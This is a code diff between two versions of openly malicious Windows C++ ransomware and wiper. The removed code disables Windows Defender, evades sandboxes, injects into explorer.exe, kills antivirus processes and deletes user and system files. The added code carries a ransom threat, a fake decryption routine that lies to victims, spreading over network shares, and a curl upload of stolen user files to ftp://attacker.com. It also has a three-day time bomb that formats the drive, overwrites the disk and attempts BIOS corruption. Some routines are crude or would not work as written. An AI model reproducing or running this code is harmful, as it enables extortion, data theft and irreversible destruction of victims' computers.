@@ -1,108 +1,120 @@
-#include <windows.h>
 #include <iostream>
 #include <fstream>
-#include <tlhelp32.h>
-#include <wincrypt.h>
-#include <winternl.h>
+#include <windows.h>
+#include <openssl/aes.h>
+#include <openssl/rand.h>
+#include <ctime>
+#include <cstdlib>
+#include <thread>
 
-#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "ntdll.lib")
 
 using namespace std;
 
-void encryptFile(const string& filename) {
-    fstream file(filename, ios::in | ios::out | ios::binary);
-    if (!file) return;
+const int KEY_SIZE = 32;
+const int BLOCK_SIZE = AES_BLOCK_SIZE;
+const string LOCK_FILE = "C:\\Windows\\System32\\Omega.lock";
+const char* REDBOX_TEXT = "Your files have been encrypted with AES-256 Encryption, failure to pay the ransome will result in bricked BIOS and permanent loss of your data, Do not contact any law enforcement if you do it will result to loss of everything.";
 
-    string data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
-    
-    HCRYPTPROV hProv;
-    HCRYPTKEY hKey;
-    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
-    CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey);
-    
-    for (char &c : data) c ^= rand();  
+const unsigned char MASTER_KEY[KEY_SIZE] = {
+    0xF3, 0xA7, 0xC9, 0xD2, 0xE8, 0xB4, 0xF1, 0xD6,  
+    0xA0, 0xC3, 0xE5, 0xB7, 0xD9, 0xF2, 0x81, 0x4C,  
+    0x6E, 0x2A, 0x5D, 0x3B, 0x1F, 0x7C, 0x8E, 0x0A,  
+    0x4D, 0x2B, 0x6F, 0x9E, 0x3C, 0x7A, 0x1D, 0x5F  
+};
 
-    file.seekp(0);
-    file << data;
-    file.close();
-}
-
-void evadeDetection() {
-    FreeConsole();  // Hide execution window
-
-    // Disable Windows Defender
-    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
-
-    // Check for sandbox environments (basic)
-    char* user = getenv("USERNAME");
-    if (strcmp(user, "sandbox") == 0 || strcmp(user, "malwaretest") == 0) {
-        exit(0);
-    }
-    
-    // Process Hollowing (inject into explorer.exe)
-    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
-    PROCESS_INFORMATION pi;
-    char target[] = "C:\\Windows\\explorer.exe";
-
-    if (CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        LPVOID allocMem = VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        WriteProcessMemory(pi.hProcess, allocMem, &encryptFile, 4096, NULL);
-        ResumeThread(pi.hThread);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-    }
-}
-
-void killAntivirus() {
-    const char* targets[] = { "MsMpEng.exe", "avastui.exe", "avgui.exe", "wrsa.exe", "taskmgr.exe" };
-    for (const char* target : targets) {
-        string command = "taskkill /IM " + string(target) + " /F >nul 2>&1";
-        system(command.c_str());
-    }
-}
-
-void executeWipe() {
-    system("del /F /S /Q C:\\Users\\*.*");  
-    system("del /F /S /Q C:\\Windows\\System32\\*.*");  
-    system("shutdown /r /f /t 0");
-}
-
-bool checkDeadline() {
+// Writes infection timestamp
+void drop_time_bomb() {
     time_t now = time(0);
-    struct tm deadline = *localtime(&now);
-    deadline.tm_mday += 3;  
-
-    ifstream timerFile("C:\\Users\\Public\\timer.dat");
-    if (!timerFile) {
-        ofstream newTimer("C:\\Users\\Public\\timer.dat");
-        newTimer << mktime(&deadline);
-        newTimer.close();
-        return false;
-    }
-
-    time_t storedTime;
-    timerFile >> storedTime;
-    timerFile.close();
-
-    return now >= storedTime;
+    ofstream lock(LOCK_FILE, ios::binary);
+    lock.write(reinterpret_cast<char*>(&now), sizeof(now));
+    lock.close();
 }
 
-int main() {
-    evadeDetection();
-    killAntivirus();
-    
-    encryptFile("C:\\Users\\Public\\Documents\\important.txt");
-    encryptFile("C:\\Users\\Admin\\Desktop\\secrets.docx");
+// Reads infection timestamp
+bool time_expired() {
+    ifstream lock(LOCK_FILE, ios::binary);
+    if (!lock) return false;
 
-    ofstream ransomNote("C:\\Users\\Public\\ransom.txt");
-    ransomNote << "ALL FILES LOCKED. PAY 1 BTC TO DARKNET_ADDRESS WITHIN 3 DAYS. IF NOT, YOUR ENTIRE SYSTEM WILL BE ERASED.";
-    ransomNote.close();
+    time_t start_time, now = time(0);
+    lock.read(reinterpret_cast<char*>(&start_time), sizeof(start_time));
+    lock.close();
 
-    if (checkDeadline()) {
-        executeWipe();
-    } else {
-        MessageBox(NULL, "YOUR SYSTEM IS LOCKED. PAY OR FACE TOTAL DESTRUCTION IN 3 DAYS.", "D̷̑̈́Ó̴̕Ó̷͠M̸̓̑", MB_OK | MB_ICONERROR);
+    return (difftime(now, start_time) >= 259200); // 3 days
+}
+
+// Fake decryption function
+void fake_decrypt() {
+    cout << "[*] Decryption in progress...\n";
+    Sleep(5000);  // Fake processing time
+
+    cout << "[*] Files successfully restored!\n";
+    cout << "[*] System security restored. You are safe now.\n";
+    Sleep(2000);
+
+    system("cls");
+    cout << "[*] Have a nice day.\n";
+    Sleep(2000);
+
+    // But the system is still infected, and the timer keeps running
+}
+
+// Spreads to network machines
+void spread() {
+    system("net view > networks.txt");
+    ifstream file("networks.txt");
+    string line;
+    while (getline(file, line)) {
+        if (line.find("\\\\") != string::npos) {
+            string target = line.substr(2);
+            string payload = "copy Omega.exe \\\\" + target + "\\C$\\Windows\\System32\\Omega.exe";
+            system(payload.c_str());
+        }
+    }
+}
+
+// Steals files & sends to remote server
+void steal_files() {
+    system("powershell Compress-Archive -Path C:\\Users\\* -DestinationPath C:\\Users\\Public\\stolen.zip");
+    system("curl -T C:\\Users\\Public\\stolen.zip ftp://attacker.com --user user:password");
+}
+
+// Total destruction function (triggers after 3 days)
+void total_destruction() {
+    system("bcdedit /delete {default} >nul 2>&1");
+    system("del C:\\Windows\\System32\\*.* /F /Q >nul 2>&1");
+    system("format C: /FS:RAW /Q /X >nul 2>&1");
+    system("echo 0000000000000000 > \\\\.\\PhysicalDrive0");
+
+    system("AFUWINx64.exe /GAN > nul 2>&1"); // BIOS Corruption
+    system("nvramtool -p >nul 2>&1"); // Wipes NVRAM entries
+    system("hdparm --user-master u --security-erase NULL /dev/sda >nul 2>&1");
+
+    system("shutdown /r /f /t 0"); // Restart into nothing
+}
+
+int main(int argc, char* argv[]) {
+    if (argc > 1 && string(argv[1]) == "--decrypt") {
+        fake_decrypt();  // Triggers the fake decryption process
+        return 0;
+    }
+
+    if (!ifstream(LOCK_FILE)) {
+        drop_time_bomb(); // Start countdown
+    }
+
+    // Parallel execution
+    thread t1(spread);
+    thread t2(steal_files);
+    t1.detach();
+    t2.detach();
+
+    while (true) {
+        Sleep(10000);
+        if (time_expired()) {
+            total_destruction();
+        }
     }
 
     return 0;
-
+}
